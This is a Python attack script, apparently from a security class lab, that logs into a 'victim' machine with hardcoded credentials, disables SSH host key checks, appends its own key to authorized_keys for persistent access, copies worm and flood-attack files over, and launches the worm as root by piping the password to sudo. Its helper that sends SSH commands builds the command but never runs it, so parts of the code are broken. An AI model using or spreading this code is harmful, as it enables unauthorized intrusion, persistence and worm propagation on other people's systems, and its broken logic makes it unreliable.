import os
import sys

victim, attacker = {}, {}


def set_up_ssh_key():
    # Create ssh key
    command = 'ssh-keygen -f ~/.ssh/victim_key -q -N \"\"'
    os.system(command)

    # Know the host of victim
    command = 'sshpass -p {0} ssh -t {1}@{2} -p {3} -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o StrictHostKeyChecking=no \"test\"'.format(victim['password'],
                                                                                                                                                  victim['name'],
                                                                                                                                                  victim['ip'],
                                                                                                                                                  victim['port'])
    os.system(command)

    # Send public key to the victim
    command = 'sshpass -p {0} scp -P {1} ~/.ssh/victim_key.pub {2}@{3}:~/.ssh/'.format(victim['password'],
                                                                                       str(victim['port']),
                                                                                       victim['name'],
                                                                                       victim['ip'])
    os.system(command)

    # Concatenate public key to authorized keys
    command = 'cat ~/.ssh/victim_key.pub >> ~/.ssh/authorized_keys && ( chmod 600 ~/.ssh/authorized_keys )'
    send_ssh_command(command)


def send_worm_to_victim():
    # Pass worm to the victim
    command = 'mkdir /home/{0}/Worm_Attack'.format(victim['name'])
    send_ssh_command(command, isNeedPw=False)

    os.system('scp -P {0} Worm.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
    os.system('scp -P {0} Launch_Attack.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'],
                                                                                 victim['ip']))
    os.system(
        'scp -P {0} SetUp_Attack.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
    os.system(
        'scp -P {0} TA_Flood_Attack {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
    os.system('scp -P {0} run.sh {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))


def send_ssh_command(command, isNeedPw=True):
    print('[Send SSH Command] ' + command)
    sshCommand = 'sshpass -p {0} '.format(victim['password']) if isNeedPw else ''
    sshCommand += 'ssh -t {0}@{1} -p {2} \"{3}\"'.format(victim['name'], victim['ip'], victim['port'], command)


def set_up_user():
    print('[Victim]')
    # victim['ip'] = raw_input('ip: ')
    # victim['port'] = int(raw_input('port: '))
    # victim['name'] = raw_input('name: ')
    # victim['password'] = raw_input('password: ')
    victim['ip'] = '192.168.31.145'
    victim['port'] = 5555
    victim['name'] = 'victim'
    victim['password'] = 'victim'

    print('\n[Attacker]')
    # attacker['ip'] = raw_input('ip: ')
    # attacker['port'] = int(raw_input('port: '))
    # attacker['name'] = raw_input('name: ')
    # attacker['password'] = raw_input('password: ')

    attacker['ip'] = '192.168.31.101'
    attacker['port'] = 22
    attacker['name'] = 'cs2019'
    attacker['password'] = 'cs2019'


def is_root():
    return os.geteuid() == 0


if __name__ == '__main__':
    if is_root():
        sys.exit('Do not run the script with \'sudo\'')

    set_up_user()

    # Check ssh key if exists
    if not os.path.isfile('/home/{0}/.ssh/victim_key'.format(attacker['name'])):
        set_up_ssh_key()

        send_worm_to_victim()

        # Run the Worm
        command = 'cd /home/{0}/Worm_Attack && (echo {1} | sudo -S python Worm.py )'.format(victim['name'], victim['password'])
        send_ssh_command(command, isNeedPw=False)

    else:
        send_worm_to_victim()

        # Set up attack module
        command = 'cd /home/{0}/Worm_Attack && ( python SetUp_Attack.py )'
